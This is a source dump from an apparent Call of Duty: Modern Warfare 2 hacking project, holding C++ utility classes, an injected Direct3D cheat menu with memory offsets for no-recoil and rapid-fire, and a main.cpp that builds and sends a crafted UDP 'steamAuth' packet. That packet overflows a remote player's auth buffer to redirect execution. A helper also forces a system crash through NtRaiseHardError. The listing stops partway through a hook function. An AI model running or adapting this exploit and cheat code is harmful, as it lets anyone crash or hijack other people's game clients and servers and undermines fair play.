	void* Memory::Allocate(size_t length)
	{
		void* data = calloc(length, 1);
		assert(data != nullptr);
		return data;
	}

	char* Memory::DuplicateString(std::string string)
	{
		char* newString = Memory::AllocateArray<char>(string.size() + 1);
		std::memmove(newString, string.data(), string.size());
		return newString;
	}

	void Memory::Free(void* data)
	{
		if (data)
		{
			free(data);
		}
	}

	void Memory::Free(const void* data)
	{
		Memory::Free(const_cast<void*>(data));
	}

	void Memory::FreeAlign(void* data)
	{
		if (data)
		{
			_aligned_free(data);
		}
	}

	void Memory::FreeAlign(const void* data)
	{
		Memory::FreeAlign(const_cast<void*>(data));
	}

	// Complementary function for memset, which checks if memory is filled with a char
	bool Memory::IsSet(void* mem, char chr, size_t length)
	{
		char* memArr = reinterpret_cast<char*>(mem);

		for (size_t i = 0; i < length; ++i)
		{
			if (memArr[i] != chr)
			{
				return false;
			}
		}

		return true;
	}

	bool Memory::IsBadReadPtr(const void* ptr)
	{
		MEMORY_BASIC_INFORMATION mbi = { nullptr };
		if (VirtualQuery(ptr, &mbi, sizeof(mbi)))
		{
			DWORD mask = (PAGE_READONLY | PAGE_READWRITE | PAGE_WRITECOPY | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY);
			bool b = !(mbi.Protect & mask);
			// check the page is not a guard page
			if (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) b = true;

			return b;
		}
		return true;
	}

	bool Memory::IsBadCodePtr(const void* ptr)
	{
		MEMORY_BASIC_INFORMATION mbi = { nullptr };
		if (VirtualQuery(ptr, &mbi, sizeof(mbi)))
		{
			DWORD mask = (PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY);
			bool b = !(mbi.Protect & mask);
			// check the page is not a guard page
			if (mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS)) b = true;

			return b;
		}
		return true;
	}

	Utils::Memory::Allocator* Memory::GetAllocator()
	{
		return &Memory::MemAllocator;
	}
}

```

`Injector Features/Utils/Memory.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

namespace Utils
{
	class Memory
	{
	public:
		class Allocator
		{
		public:
			typedef void(*FreeCallback)(void*);

			Allocator()
			{
				this->pool.clear();
				this->refMemory.clear();
			}
			~Allocator()
			{
				this->clear();
			}

			void clear()
			{
				std::lock_guard<std::mutex> _(this->mutex);

				for (auto i = this->refMemory.begin(); i != this->refMemory.end(); ++i)
				{
					if (i->first && i->second)
					{
						i->second(i->first);
					}
				}

				this->refMemory.clear();

				for (auto& data : this->pool)
				{
					Memory::Free(data);
				}

				this->pool.clear();
			}

			void free(void* data)
			{
				std::lock_guard<std::mutex> _(this->mutex);

				auto i = this->refMemory.find(data);
				if (i != this->refMemory.end())
				{
					i->second(i->first);
					this->refMemory.erase(i);
				}

				auto j = std::find(this->pool.begin(), this->pool.end(), data);
				if (j != this->pool.end())
				{
					Memory::Free(data);
					this->pool.erase(j);
				}
			}

			void free(const void* data)
			{
				this->free(const_cast<void*>(data));
			}

			void reference(void* memory, FreeCallback callback)
			{
				std::lock_guard<std::mutex> _(this->mutex);

				this->refMemory[memory] = callback;
			}

			void* allocate(size_t length)
			{
				std::lock_guard<std::mutex> _(this->mutex);

				void* data = Memory::Allocate(length);
				this->pool.push_back(data);
				return data;
			}
			template <typename T> inline T* allocate()
			{
				return this->allocateArray<T>(1);
			}
			template <typename T> inline T* allocateArray(size_t count = 1)
			{
				return static_cast<T*>(this->allocate(count * sizeof(T)));
			}

			bool empty()
			{
				return (this->pool.empty() && this->refMemory.empty());
			}

			char* duplicateString(std::string string)
			{
				std::lock_guard<std::mutex> _(this->mutex);

				char* data = Memory::DuplicateString(string);
				this->pool.push_back(data);
				return data;
			}

			bool isPointerMapped(void* ptr)
			{
				return this->ptrMap.find(ptr) != this->ptrMap.end();
			}

			template <typename T> T* getPointer(void* oldPtr)
			{
				if (this->isPointerMapped(oldPtr))
				{
					return reinterpret_cast<T*>(this->ptrMap[oldPtr]);
				}

				return nullptr;
			}

			void mapPointer(void* oldPtr, void* newPtr)
			{
				this->ptrMap[oldPtr] = newPtr;
			}

		private:
			std::mutex mutex;
			std::vector<void*> pool;
			std::unordered_map<void*, void*> ptrMap;
			std::unordered_map<void*, FreeCallback> refMemory;
		};

		static void* AllocateAlign(size_t length, size_t alignment);
		static void* Allocate(size_t length);
		template <typename T> static inline T* Allocate()
		{
			return AllocateArray<T>(1);
		}
		template <typename T> static inline T* AllocateArray(size_t count = 1)
		{
			return static_cast<T*>(Allocate(count * sizeof(T)));
		}

		static char* DuplicateString(std::string string);

		static void Free(void* data);
		static void Free(const void* data);

		static void FreeAlign(void* data);
		static void FreeAlign(const void* data);

		static bool IsSet(void* mem, char chr, size_t length);

		static bool IsBadReadPtr(const void* ptr);
		static bool IsBadCodePtr(const void* ptr);

		static Utils::Memory::Allocator* GetAllocator();

	private:
		static Utils::Memory::Allocator MemAllocator;
	};
}

```

`Injector Features/Utils/NT.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	namespace NT
	{
		Module Module::Load(std::string module)
		{
			return Module(module, true);
		}

		Module Module::GetByAddress(void* address)
		{
			HMODULE module = nullptr;
			GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, reinterpret_cast<LPCSTR>(address), &module);
			return Module(module);
		}

		void Module::AddLoadPath(std::string path)
		{
			char outBuffer[MAX_PATH] = { 0 };
			if (_fullpath(outBuffer, path.data(), sizeof(outBuffer)))
			{
				path = outBuffer;
				AddDllDirectory(std::wstring(path.begin(), path.end()).data());
				SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_DEFAULT_DIRS | LOAD_LIBRARY_SEARCH_USER_DIRS);
			}
		}

		Module::Module()
		{
			this->module = GetModuleHandleA(nullptr);
		}

		Module::Module(std::string name, bool load)
		{
			if (load) this->module = LoadLibraryA(name.data());
			else this->module = GetModuleHandleA(name.data());
		}

		Module::Module(HMODULE handle)
		{
			this->module = handle;
		}

		bool Module::operator==(const Module &obj) const
		{
			return this->module == obj.module;
		}

		PIMAGE_NT_HEADERS Module::getNTHeaders()
		{
			if (!this->isValid()) return nullptr;
			return reinterpret_cast<PIMAGE_NT_HEADERS>(this->getPtr() + this->getDOSHeader()->e_lfanew);
		}

		PIMAGE_DOS_HEADER Module::getDOSHeader()
		{
			return reinterpret_cast<PIMAGE_DOS_HEADER>(this->getPtr());
		}

		PIMAGE_OPTIONAL_HEADER Module::getOptionalHeader()
		{
			if (!this->isValid()) return nullptr;
			return &this->getNTHeaders()->OptionalHeader;
		}

		std::vector<PIMAGE_SECTION_HEADER> Module::getSectionHeaders()
		{
			std::vector<PIMAGE_SECTION_HEADER> headers;

			auto ntheaders = this->getNTHeaders();
			auto section = IMAGE_FIRST_SECTION(ntheaders);

			for (uint16_t i = 0; i < ntheaders->FileHeader.NumberOfSections; ++i, ++section)
			{
				if (section) headers.push_back(section);
				else OutputDebugStringA("There was an invalid section :O");
			}

			return headers;
		}

		std::uint8_t* Module::getPtr()
		{
			return reinterpret_cast<std::uint8_t*>(this->module);
		}

		void Module::unprotect()
		{
			if (!this->isValid()) return;

			DWORD protection;
			VirtualProtect(this->getPtr(), this->getOptionalHeader()->SizeOfImage, PAGE_EXECUTE_READWRITE, &protection);
		}

		size_t Module::getRelativeEntryPoint()
		{
			if (!this->isValid()) return 0;
			return this->getNTHeaders()->OptionalHeader.AddressOfEntryPoint;
		}

		void* Module::getEntryPoint()
		{
			if (!this->isValid()) return nullptr;
			return this->getPtr() + this->getRelativeEntryPoint();
		}

		bool Module::isValid()
		{
			return this->module != nullptr && this->getDOSHeader()->e_magic == IMAGE_DOS_SIGNATURE;
		}

		std::string Module::getName()
		{
			if (!this->isValid()) return "";

			std::string path = this->getPath();
			auto pos = path.find_last_of("/\\");
			if (pos == std::string::npos) return path;

			return path.substr(pos + 1);
		}

		std::string Module::getFolder()
		{
			if (!this->isValid()) return "";

			std::string path = this->getPath();
			auto pos = path.find_last_of("/\\");
			if (pos == std::string::npos) return ".\\";

			return path.substr(0, pos + 1);
		}

		std::string Module::getPath()
		{
			if (!this->isValid()) return "";

			char name[MAX_PATH] = { 0 };
			GetModuleFileNameA(this->module, name, sizeof name);

			return name;
		}

		void Module::free()
		{
			if (this->isValid())
			{
				FreeLibrary(this->module);
				this->module = nullptr;
			}
		}

		HMODULE Module::getHandle()
		{
			return this->module;
		}

		size_t Module::getCodeSize()
		{
			if (this->isValid())
			{
				auto headers = this->getSectionHeaders();
				for (auto& header : headers)
				{
					if (LPSTR(header->Name) == ".text"s)
					{
						return header->SizeOfRawData;
					}
				}
			}

			return 0;
		}

		void* Module::getCodeStart()
		{
			if (this->isValid())
			{
				auto headers = this->getSectionHeaders();
				for (auto& header : headers)
				{
					if (LPSTR(header->Name) == ".text"s)
					{
						return this->getPtr() + header->VirtualAddress;
					}
				}
			}

			return nullptr;
		}

		void** Module::getIATEntry(std::string moduleName, std::string procName)
		{
			if (!this->isValid()) return nullptr;

			Module otherModule(moduleName);
			if (!otherModule.isValid()) return nullptr;

			void* targetFunction = otherModule.getProc<void*>(procName);
			if (!targetFunction) return nullptr;

			auto* header = this->getOptionalHeader();
			if (!header) return nullptr;

			auto* importDescriptor = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(this->getPtr() + header->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

			while (importDescriptor->Name)
			{
				if (!_stricmp(reinterpret_cast<char*>(this->getPtr() + importDescriptor->Name), moduleName.data()))
				{
					auto* originalThunkData = reinterpret_cast<PIMAGE_THUNK_DATA>(importDescriptor->OriginalFirstThunk + this->getPtr());
					auto* thunkData = reinterpret_cast<PIMAGE_THUNK_DATA>(importDescriptor->FirstThunk + this->getPtr());

					while(originalThunkData->u1.AddressOfData)
					{
						LPSTR name = nullptr;

						if (IMAGE_SNAP_BY_ORDINAL(originalThunkData->u1.Ordinal))
						{
							name = MAKEINTRESOURCEA(IMAGE_ORDINAL(originalThunkData->u1.Ordinal));
						}
						else
						{
							name = PIMAGE_IMPORT_BY_NAME(this->getPtr() + originalThunkData->u1.ForwarderString)->Name;
						}

						if (GetProcAddress(otherModule.module, name) == targetFunction)
						{
							return reinterpret_cast<void**>(&thunkData->u1.Function);
						}

						++originalThunkData;
						++thunkData;
					}

					break;
				}

				++importDescriptor;
			}

			return nullptr;
		}

#ifdef _DELAY_IMP_VER
		bool Module::delayImport()
		{
			return SUCCEEDED(__HrLoadAllImportsForDll(this->getName().data()));
		}
#endif

		void RaiseHardException()
		{
			int data = false;
			Utils::NT::Module ntdll("ntdll.dll");
			ntdll.invokePascal<NTSTATUS>("RtlAdjustPrivilege", 19, true, false, &data);
			ntdll.invokePascal<NTSTATUS>("NtRaiseHardError", 0xC000007B, 0, nullptr, nullptr, 6, &data);
		}
	}
}

```

`Injector Features/Utils/NT.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

typedef PVOID *PPVOID;

namespace Utils
{
	namespace NT
	{
		class Module
		{
		public:
			static Module Load(std::string module);
			static Module GetByAddress(void* address);
			static void AddLoadPath(std::string path);

			Module();
			Module(std::string name, bool load = false);
			Module(HMODULE handle);

			Module(const Module& a) : module(a.module) {}

			bool operator!=(const Module &obj) const { return !(*this == obj); };
			bool operator==(const Module &obj) const;

			void unprotect();
			void* getEntryPoint();
			size_t getRelativeEntryPoint();

			bool isValid();
			std::string getName();
			std::string getPath();
			std::string getFolder();
			std::uint8_t* getPtr();
			void free();

			HMODULE getHandle();

			template <typename T>
			T getProc(std::string process)
			{
				if (!this->isValid()) nullptr;
				return reinterpret_cast<T>(GetProcAddress(this->module, process.data()));
			}

			template <typename T>
			std::function<T> get(std::string process)
			{
				if (!this->isValid()) std::function<T>();
				return reinterpret_cast<T*>(this->getProc<void*>(process));
			}

			template<typename T, typename... Args>
			T invoke(std::string process, Args... args)
			{
				auto method = this->get<T(__cdecl)(Args...)>(process);
				if (method) return method(args...);
				return T();
			}

			template<typename T, typename... Args>
			T invokePascal(std::string process, Args... args)
			{
				auto method = this->get<T(__stdcall)(Args...)>(process);
				if (method) return method(args...);
				return T();
			}

			template<typename T, typename... Args>
			T invokeThis(std::string process, void* thisPtr, Args... args)
			{
				auto method = this->get<T(__thiscall)(void*,Args...)>(thisPtr, process);
				if (method) return method(args...);
				return T();
			}

			std::vector<PIMAGE_SECTION_HEADER> getSectionHeaders();

			PIMAGE_NT_HEADERS getNTHeaders();
			PIMAGE_DOS_HEADER getDOSHeader();
			PIMAGE_OPTIONAL_HEADER getOptionalHeader();

			size_t getCodeSize();
			void* getCodeStart();

			void** getIATEntry(std::string moduleName, std::string procName);

#ifdef _DELAY_IMP_VER
			bool delayImport();
#endif

		private:
			HMODULE module;
		};

		void RaiseHardException();
	}
}

```

`Injector Features/Utils/Network.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	namespace Network
	{
		u_short IPChecksum(const u_short* buf, u_short length)
		{
			u_short checkSum = 0;
			for (int i = 0; i < length; i += 2)
			{
				u_short field = ntohs(buf[i / 2]);
				u_short diff = 65535 - checkSum;
				checkSum += field;
				if (field > diff) checkSum += 1;
			}

			return htons(~checkSum);
		}

		u_short UDPChecksum(in_addr saddr, in_addr daddr, u_short sport, u_short dport, u_char protocol, std::string data)
		{
			Utils::Buffer buffer;
			buffer.write<u_char>(protocol);
			buffer.write<in_addr>(saddr);
			buffer.write<in_addr>(daddr);

			u_short length = htons(u_short(data.size()) + 8);
			buffer.write<u_short>(length);
			buffer.write<u_short>(length);

			buffer.write<u_short>(htons(sport));
			buffer.write<u_short>(htons(dport));

			buffer.append(data);

			if (buffer.size() % 2) buffer.push_back(0);

			return ntohs(Network::IPChecksum(PUSHORT(buffer.data()), u_short(buffer.size())));
		}
	}
}

```

`Injector Features/Utils/Network.hpp`:

```hpp
#pragma once

namespace Utils
{
	namespace Network
	{
		u_short IPChecksum(const u_short* buf, u_short length);
		u_short UDPChecksum(in_addr saddr, in_addr daddr, u_short sport, u_short dport, u_char protocol, std::string data);
	}
}

```

`Injector Features/Utils/Queue.hpp`:

```hpp
#pragma once

namespace Utils
{
	template<typename T>
	class Queue
	{
	public:
		bool empty()
		{
			//std::lock_guard<std::mutex> _(mutex);
			return this->queue.empty();
		}

		T front()
		{
			std::lock_guard<std::mutex> _(mutex);
			return this->queue.front();
		}
		
		void pop()
		{
			std::lock_guard<std::mutex> _(mutex);
			return this->queue.pop();
		}

		void push(T obj)
		{
			std::lock_guard<std::mutex> _(mutex);
			return this->queue.push(obj);
		}

		size_t size()
		{
			std::lock_guard<std::mutex> _(mutex);
			return this->queue.size();
		}

	private:
		std::mutex mutex;
		std::queue<T> queue;
	};
}

```

`Injector Features/Utils/Signal.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

namespace Utils
{
	template <typename T> using Slot = std::function<T>;
	template <typename T>
	class Signal
	{
	public:
		Signal()
		{
			std::lock_guard<std::recursive_mutex> _(this->mutex);

			this->slots.clear();
		}

		Signal(Signal& obj) : Signal()
		{
			std::lock_guard<std::recursive_mutex> _(this->mutex);
			std::lock_guard<std::recursive_mutex> __(obj.mutex);

			Utils::Merge(&this->slots, obj.getSlots());
		}

		void connect(Slot<T> slot)
		{
			std::lock_guard<std::recursive_mutex> _(this->mutex);

			if (slot)
			{
				this->slots.push_back(slot);
			}
		}

		void clear()
		{
			std::lock_guard<std::recursive_mutex> _(this->mutex);

			this->slots.clear();
		}

		std::vector<Slot<T>>& getSlots()
		{
			return this->slots;
		}

		template <class ...Args>
		void operator()(Args&&... args) const
		{
			std::lock_guard<std::recursive_mutex> _(this->mutex);

			std::vector<Slot<T>> copiedSlots;
			Utils::Merge(&copiedSlots, this->slots);

			for (auto& slot : copiedSlots)
			{
				if (slot)
				{
					slot(std::forward<Args>(args)...);
				}
			}
		}

	private:
		mutable std::recursive_mutex mutex;
		std::vector<Slot<T>> slots;
	};
}
```

`Injector Features/Utils/SignalHandler.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	std::mutex SignalHandler::Mutex;
	SignalHandler* SignalHandler::MainHandler;

#ifdef _WIN32
	BOOL WINAPI SignalHandler::Handler(DWORD signal)
	{
		if ((signal == CTRL_C_EVENT || signal == CTRL_CLOSE_EVENT) && SignalHandler::MainHandler && SignalHandler::MainHandler->callback)
		{
			SignalHandler::MainHandler->callback();
		}

		return TRUE;
	}

#elif defined(_POSIX)
	void SignalHandler::Handler(int signal)
	{
		if (signal == SIGINT && SignalHandler::MainHandler && SignalHandler::MainHandler->callback)
		{
			SignalHandler::MainHandler->callback();
		}
	}
#endif

	SignalHandler::SignalHandler(Utils::Slot<void()> _callback) : std::lock_guard<std::mutex>(SignalHandler::Mutex), callback(_callback)
	{
#ifdef _WIN32
		SetConsoleCtrlHandler(SignalHandler::Handler, TRUE);
#elif defined(_POSIX)
		signal(SIGINT, SignalHandler::Handler);
#endif

		SignalHandler::MainHandler = this;
	}

	SignalHandler::~SignalHandler()
	{
#ifdef _WIN32
		SetConsoleCtrlHandler(SignalHandler::Handler, FALSE);
#elif defined(_POSIX)
		signal(SIGINT, SIG_DFL);
#endif

		SignalHandler::MainHandler = nullptr;
	}
}

```

`Injector Features/Utils/SignalHandler.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

namespace Utils
{
	class SignalHandler : std::lock_guard<std::mutex>
	{
	public:
		SignalHandler(Utils::Slot<void()> callback);
		~SignalHandler();

	private:
		Utils::Slot<void()> callback;

		static std::mutex Mutex;
		static SignalHandler* MainHandler;

#ifdef _WIN32
		static BOOL WINAPI Handler(DWORD signal);
#elif defined(_POSIX)
		static void Handler(int signal);
#endif
	};
}

```

`Injector Features/Utils/String.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	const char *String::VA(const char *fmt, ...)
	{
		static
#ifndef VA_DONT_USE_THREAD_STORAGE
			thread_local
#endif
			String::VAProvider<8, 256> provider;

		va_list ap;
		va_start(ap, fmt);

		const char* result = provider.get(fmt, ap);

		va_end(ap);
		return result;
	}

	std::string String::DumpHex(std::string data, std::string separator)
	{
		std::string result;

		for (unsigned int i = 0; i < data.size(); ++i)
		{
			if (i > 0)
			{
				result.append(separator);
			}

			result.append(Utils::String::VA("%02X", data[i] & 0xFF));
		}

		return result;
	}

	std::vector<std::string> String::Explode(const std::string& str, char delim)
	{
		std::vector<std::string> result;
		std::istringstream iss(str);

		for (std::string token; std::getline(iss, token, delim);)
		{
			result.push_back(std::move(token));
		}

		return result;
	}

	String String::toLower()
	{
		String out(*this);
		std::transform(out.begin(), out.end(), out.begin(), ::tolower);
		return out;
	}

	String String::toUpper()
	{
		String out(*this);
		std::transform(out.begin(), out.end(), out.begin(), ::toupper);
		return out;
	}

	bool String::endsWith(Utils::String otherString)
	{
		if (otherString.size() > this->size()) return false;
		return std::equal(otherString.begin(), otherString.end(), this->begin() + (this->size() - otherString.size()));
	}

	bool String::startsWith(Utils::String otherString)
	{
		if (otherString.size() > this->size()) return false;
		return std::equal(otherString.begin(), otherString.end(), this->begin());
	}

	String String::replaceAll(std::string find, std::string replace)
	{
		size_t pos = 0;
		String string(*this);
		while ((pos = string.find(find, pos)) != std::string::npos)
		{
			string = string.replace(pos, find.size(), replace);
			pos += replace.length();
		}

		return string;
	}
}

```

`Injector Features/Utils/String.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

namespace Utils
{
	class String : public std::string
	{
	public:
		template <size_t Buffers, size_t MinBufferSize>
		class VAProvider
		{
		public:
			static_assert(Buffers != 0 && MinBufferSize != 0, "Buffers and MinBufferSize mustn't be 0");

			VAProvider() : currentBuffer(0) {}
			~VAProvider() {}

			char* get(const char* format, va_list ap)
			{
				++this->currentBuffer %= ARRAYSIZE(this->stringPool);
				auto entry = &this->stringPool[this->currentBuffer];

				if (!entry->size || !entry->buffer)
				{
					throw std::runtime_error("String pool not initialized");
				}

				while (true)
				{
					int res = vsnprintf_s(entry->buffer, entry->size, _TRUNCATE, format, ap);
					if (res > 0) break; // Success
					if (res == 0) return ""; // Error

					entry->doubleSize();
				}

				return entry->buffer;
			}

		private:
			class Entry
			{
			public:
				Entry(size_t _size = MinBufferSize) : size(_size), buffer(nullptr)
				{
					if (this->size < MinBufferSize) this->size = MinBufferSize;
					this->allocate();
				}

				~Entry()
				{
					if (this->buffer) Utils::Memory::GetAllocator()->free(this->buffer);
					this->size = 0;
					this->buffer = nullptr;
				}

				void allocate()
				{
					if (this->buffer) Utils::Memory::GetAllocator()->free(this->buffer);
					this->buffer = Utils::Memory::GetAllocator()->allocateArray<char>(this->size + 1);
				}

				void doubleSize()
				{
					this->size *= 2;
					this->allocate();
				}

				size_t size;
				char* buffer;
			};

			size_t currentBuffer;
			Entry stringPool[Buffers];
		};

		static const char *VA(const char *fmt, ...);
		static std::string DumpHex(std::string data, std::string separator);
		static std::vector<std::string> Explode(const std::string& str, char delim);

//----------------------------------------------------------------------------------------

		String() : std::string() {}
		String(std::string data) : std::string(data) {}
		String(const char* data, size_t len) : std::string(data, len) {}
		String(const char* data) : std::string(data) {}

		String toLower();
		String toUpper();

		bool startsWith(Utils::String otherString);
		bool endsWith(Utils::String otherString);
		String replaceAll(std::string find, std::string replace);
	};
}

```

`Injector Features/Utils/Time.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	namespace Time
	{
		void Interval::update()
		{
			this->lastPoint = std::chrono::high_resolution_clock::now();
		}

		void Interval::zero()
		{
			this->lastPoint = std::chrono::high_resolution_clock::time_point();
		}

		bool Interval::elapsed(std::chrono::nanoseconds nsecs)
		{
			return ((std::chrono::high_resolution_clock::now() - this->lastPoint) >= nsecs);
		}
	}
}

```

`Injector Features/Utils/Time.hpp`:

```hpp
#pragma once

namespace Utils
{
	namespace Time
	{
		class Interval
		{
		protected:
			std::chrono::high_resolution_clock::time_point lastPoint;

		public:
			Interval() : lastPoint(std::chrono::high_resolution_clock::now()) {}

			void update();
			void zero();
			bool elapsed(std::chrono::nanoseconds nsecs);
		};
	}
}

```

`Injector Features/Utils/Utils.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	void SetEnvironment()
	{
		wchar_t exeName[512];
		GetModuleFileName(GetModuleHandle(nullptr), exeName, sizeof(exeName) / 2);

		wchar_t* exeBaseName = wcsrchr(exeName, L'\\');
		exeBaseName[0] = L'\0';

		SetCurrentDirectory(exeName);
	}

	std::string LoadResource(int resId)
	{
		Utils::NT::Module module;
		HRSRC res = FindResource(module.getHandle(), MAKEINTRESOURCE(resId), RT_RCDATA);
		if (!res) return "";

		HGLOBAL handle = LoadResource(nullptr, res);
		if (!handle) return "";

		return std::string(LPSTR(LockResource(handle)), SizeofResource(nullptr, res));
	}
}

```

`Injector Features/Utils/Utils.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

namespace Utils
{
	class StaticInitializer
	{
	public:
		StaticInitializer(std::function<void()> init, std::function<void()> _uninit = std::function<void()>())
		{
			if (init) init();
			this->uninit = _uninit;
		}

		~StaticInitializer()
		{
			if (this->uninit) this->uninit();
		}

	private:
		std::function<void()> uninit;
	};

	class Buffer : public std::string
	{
	public:
		Buffer() : std::string() {}
		Buffer(std::string data) : Buffer()
		{
			this->append(data);
		}

		template <typename T> void write(T data)
		{
			this->append(reinterpret_cast<char*>(&data), sizeof T);
		}

		template <typename T> T read()
		{
			T data;
			if (!this->read(&data)) throw std::runtime_error("Buffer overflow");
			return data;
		}

		template <typename T> bool read(T* data)
		{
			if (this->size() < sizeof T) return false;

			std::memmove(data, this->data(), sizeof T);
			this->erase(this->begin(), this->begin() + sizeof T);

			return true;
		}
	};

	template <typename T> inline void Merge(std::vector<T>* target, T* source, size_t length)
	{
		if (source)
		{
			target->reserve(target->size() + length);
			for (size_t i = 0; i < length; ++i)
			{
				target->push_back(source[i]);
			}
		}
	}

	template <typename T> inline void Merge(std::vector<T>* target, std::vector<T> source)
	{
		target->reserve(target->size() + source.size());
		for (auto &entry : source)
		{
			target->push_back(entry);
		}
	}

	void SetEnvironment();
	std::string LoadResource(int resId);
}
```

`Injector Features/main.cpp`:

```cpp
#pragma comment (lib, "Ws2_32.lib")

#include <WinSock2.h>
#include <ws2tcpip.h>

#include <string>
#include <vector>
#include <iostream>

bool resolve_address(sockaddr_in* address, std::string target)
{
	std::string port = "28960";
	auto pos = target.find_first_of(":");
	if (pos != std::string::npos)
	{
		port = target.substr(pos + 1);
		target = target.substr(0, pos);
	}

	addrinfo hints;
	addrinfo *result = NULL;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;

	getaddrinfo(target.data(), NULL, &hints, &result);

	if (!result)
	{
		return false;
	}

	*address = *(sockaddr_in*)result->ai_addr;
	address->sin_port = htons(static_cast<unsigned short>(atoi(port.data())));
	freeaddrinfo(result);

	return true;
}

bool read_address(sockaddr_in* address)
{
	std::string target;
	std::cout << "Enter the address of your target:" << std::endl;
	std::cin >> target;

	if (target.empty())
	{
		return false;
	}

	if (!resolve_address(address, target))
	{
		std::cout << "Resolving address failed!" << std::endl;
		return false;
	}

	return true;
}

std::string build_payload()
{
	// Construct virtual stack
	std::vector<DWORD> stack;
	stack.push_back(0x4D4000); // Com_Quit_f - (MW2 1.2.159)

	// Build the malicious packet
	std::string data = "\xFF\xFF\xFF\xFF" "steamAuth";
	data.push_back(0);
	data.append("aaaaaaaa", 8); // Guid

	std::string authBuffer;
	authBuffer.resize(0x800); // Overflow the buffer

	// Append stack to authentication buffer
	authBuffer.append((char*)stack.data(), stack.size() * 4);

	unsigned short size = authBuffer.size();
	data.append((char*)&size, 2);
	data.append((char*)authBuffer.data(), authBuffer.size());

	return data;
}

void send_to_address(const sockaddr_in& address, const std::string& data)
{
	SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	sendto(sock, data.data(), data.size(), 0, reinterpret_cast<const SOCKADDR *>(&address), sizeof(address));
	closesocket(sock);
}

int main(int /*argc*/, char /*argv*/[])
{
	WSADATA wsa_data;
	WSAStartup(MAKEWORD(2, 2), &wsa_data);

	sockaddr_in address;
	if (!read_address(&address)) return 1;

	std::string payload = build_payload();

	send_to_address(address, payload);

	WSACleanup();
	return 0;
}

```

`Offsets menu/Addresses.h`:

```h
#include <Windows.h>
#pragma once
#define WindowX					0x00AA41F4
#define WindowY					0x00AA41F8
#define S_PCTC					0x00457c90
#define S_GETTAGPOS				0x0055B7D0
#define S_REGTAG				0x005048B0
#define S_TRACE					0x004F6220
#define OFFS_CG					0x0096F098
#define OFFS_RefDef				0x0098F948
#define OFFS_ScreenRes			0x00AA41F4
#define OFFS_Entity				0x009AC010
#define OFFS_Client				0x01197AD8
#define OFFS_Ammo				0x013820A0
#define S_GETSCREENMATRIX		0x004649C0
#define S_WORLDTOSCREEN			0x0047F2A0
#define SIZE_Client				0x00000270
#define SIZE_Entity				0x00000194
#define OFFS_WeaponName			0x009A7D6C
#define S_MSGBOX				0x00425540
#define OFFS_ViewAngles			0x00B363B0
//#define RapidFire1              *(int*)0x137F848					  //[integer]
//#define RapidFire2              *(int*)0x982D08						  //[integer]
#define pJumpHeight             *(float*)(*(int*)0x1d35a90 + 0xC)       //[float]
#define pFov                  *(float*)(*(int*)0xa76130 + 0xC)        //[float]
#define pSpeed                 *(int*)(*(int*)0x1357a80 + 0xC)       //[integer]
//#define remoteAccess            *(float*)(*(int*)0x12cfb54 + 0xC)		//[float]
#define pTimeWarp				*(float*)(*(int*)0x1769F38 + 0xC)		//[float]
#define pNoRecoil				0x4a2420								 //[byte]
#define pNoSpread				*(float*)(*(int*)0x1d398a8 + 0xC)		//[float]
#define pPerkCheck				0x42a8e5								 //[byte]
#define pEnableChaos				*(int*)(*(int*)0x1f1570c + 0xC)		  //[integer]
#define pActivateChaos			*(int*)(*(int*)0x1e06e98 + 0xC)		  //[integer]
#define pRapidFire				0x6477F6							  //[integer]
#define pRfPerk				*(float*)(*(int*)0x1D398F4 + 0xC)		//[float]
#define pPerkCheckADS			0x509c29							  //[integer]
#define pInstantADS				*(float*)(*(int*)0x1D398AC + 0xC)		//[float]
bool IsInGame(){return *(int*)0x1197C28 == 0 ? false : true;}
```

`Offsets menu/Base.cpp`:

```cpp
#include "Menu.h"
#include "ColorDefinitions.h"
#pragma once
LPDIRECT3DDEVICE9 g_pDevice = NULL;
oReset pReset;
oEndScene pEndScene;
Menu dMenu;

void ReFont(LPDIRECT3DDEVICE9 pDevice)
{
	if (g_pDevice != pDevice)
	{
		g_pDevice = pDevice;
		try
		{
			if (dMenu.pFont != 0)
				dMenu.pFont->Release();
			if (dMenu.pHeaderFont != 0)
				dMenu.pHeaderFont->Release();
		}
		catch (...) {}
		dMenu.pFont = 0;
		dMenu.pHeaderFont = 0;
		D3DXCreateFontA(pDevice, 14, 0, FW_NORMAL, 0, 0, DEFAULT_CHARSET, OUT_TT_ONLY_PRECIS, PROOF_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial", &dMenu.pFont);
		D3DXCreateFontA(pDevice, 14, 0, FW_BOLD, 0, 0, DEFAULT_CHARSET, OUT_TT_ONLY_PRECIS, PROOF_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial", &dMenu.pHeaderFont);
	}
}

HRESULT WINAPI Reset(IDirect3DDevice9* pDevice, D3DPRESENT_PARAMETERS* pPresentationParameters)
{
	dMenu.pFont->OnLostDevice();
	dMenu.pHeaderFont->OnLostDevice();
	HRESULT hRet = pReset(pDevice, pPresentationParameters);
